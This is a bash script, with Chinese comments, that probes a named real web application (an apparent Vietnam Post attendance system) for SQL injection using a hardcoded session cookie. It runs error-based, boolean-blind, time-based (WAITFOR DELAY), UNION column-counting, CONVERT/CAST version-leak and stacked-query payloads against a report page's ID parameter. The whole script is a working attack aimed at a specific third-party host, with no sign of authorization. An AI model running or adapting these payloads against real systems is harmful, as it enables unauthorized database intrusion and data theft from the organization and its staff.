#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥🔥🔥 SQL注入超深度挖掘"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

mkdir -p sql_deep_test && cd sql_deep_test

# 1. 基线
echo "[1] 获取基线..."
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE" > baseline.html
baseline_size=$(wc -c < baseline.html)
echo "  基线: $baseline_size bytes"
echo "  lblNote内容: $(grep -oE '<span id="lblNote">.*</span>' baseline.html)"

# 2. 单引号测试
echo -e "\n[2] 单引号测试..."
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2'" -H "Cookie: $COOKIE" > test_quote.html
quote_size=$(wc -c < test_quote.html)
echo "  单引号: $quote_size bytes (差异: $((quote_size - baseline_size)))"

if grep -qi "SQL\|syntax\|unclosed\|quotation\|varchar\|convert" test_quote.html; then
    echo "  🔥🔥🔥 SQL错误!"
    grep -i "SQL\|syntax\|unclosed\|quotation" test_quote.html | head -10
fi

# 3. 布尔盲注对比
echo -e "\n[3] 布尔盲注..."
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%27%20AND%20%271%27%3D%271" -H "Cookie: $COOKIE" > bool_true.html
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%27%20AND%20%271%27%3D%272" -H "Cookie: $COOKIE" > bool_false.html

true_size=$(wc -c < bool_true.html)
false_size=$(wc -c < bool_false.html)

echo "  True:  $true_size bytes"
echo "  False: $false_size bytes"
echo "  差异:  $((true_size - false_size)) bytes"

if [ $true_size -ne $false_size ]; then
    echo "  🔥 响应不同！可能是布尔盲注！"
    echo "  详细差异:"
    diff -u bool_true.html bool_false.html | head -50
fi

# 4. 时间盲注（手动计时）
echo -e "\n[4] 时间盲注测试..."
echo -n "  正常请求: "
time1_start=$(date +%s)
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE" > time_normal.html 2>&1
time1_end=$(date +%s)
time1=$((time1_end - time1_start))
echo "${time1}秒"

echo -n "  WAITFOR 5秒: "
time2_start=$(date +%s)
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--" -H "Cookie: $COOKIE" > time_delay5.html 2>&1
time2_end=$(date +%s)
time2=$((time2_end - time2_start))
echo "${time2}秒"

if [ $time2 -ge 5 ]; then
    echo "  🔥🔥🔥 时间盲注成功！延迟了 $time2 秒！"
fi

# 5. UNION注入 - 逐列测试
echo -e "\n[5] UNION注入列数测试..."
for i in {1..10}; do
    nulls=$(yes "NULL" | head -$i | tr '\n' ',' | sed 's/,$//')
    payload="MAU2%27+UNION+SELECT+${nulls}--"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${payload}" -H "Cookie: $COOKIE" > "union_${i}.html" 2>&1
    size=$(wc -c < "union_${i}.html")
    
    echo -n "  $i 列: $size bytes "
    
    # 检查错误
    if grep -qi "number of columns\|All queries" "union_${i}.html"; then
        echo "🔥 列数提示!"
        grep -i "number of columns\|All queries" "union_${i}.html" | head -3
    elif grep -qi "SQL\|syntax" "union_${i}.html"; then
        echo "⚠️  SQL错误"
    else
        echo ""
    fi
done

# 6. 错误注入
echo -e "\n[6] 错误注入 - 强制SQL错误..."

# 强制类型转换错误
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%27+AND+1%3DCONVERT(INT%2C@@VERSION)--" -H "Cookie: $COOKIE" > error_convert.html
if grep -qi "SQL\|syntax\|microsoft\|version" error_convert.html; then
    echo "  🔥🔥🔥 CONVERT错误泄露!"
    grep -i "SQL\|microsoft\|version" error_convert.html | head -10
fi

# CAST错误
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%27+AND+1%3DCAST(@@VERSION+AS+INT)--" -H "Cookie: $COOKIE" > error_cast.html
if grep -qi "SQL\|syntax\|microsoft\|version" error_cast.html; then
    echo "  🔥🔥🔥 CAST错误泄露!"
    grep -i "SQL\|microsoft\|version" error_cast.html | head -10
fi

# 7. 堆叠查询
echo -e "\n[7] 堆叠查询测试..."
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2%27%3BSELECT+@@VERSION--" -H "Cookie: $COOKIE" > stack_version.html
stack_size=$(wc -c < stack_version.html)
echo "  堆叠查询: $stack_size bytes"

if grep -qi "Microsoft SQL Server\|MySQL\|version" stack_version.html; then
    echo "  🔥🔥🔥 版本信息泄露!"
    grep -i "Microsoft SQL Server\|MySQL\|version" stack_version.html | head -5
fi

# 8. 查看所有文件内容
echo -e "\n[8] 检查所有响应中的lblNote内容..."
for file in *.html; do
    lblnote=$(grep -oE '<span id="lblNote">.*</span>' "$file" 2>/dev/null || echo "无lblNote")
    if [ "$lblnote" != "无lblNote" ] && [ "$lblnote" != '<span id="lblNote"><b><font color="#FF3300"></font></b></span>' ]; then
        echo "  $file: $lblnote"
    fi
done

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 测试完成"
ls -lh *.html | wc -l
echo "个HTML文件已生成"
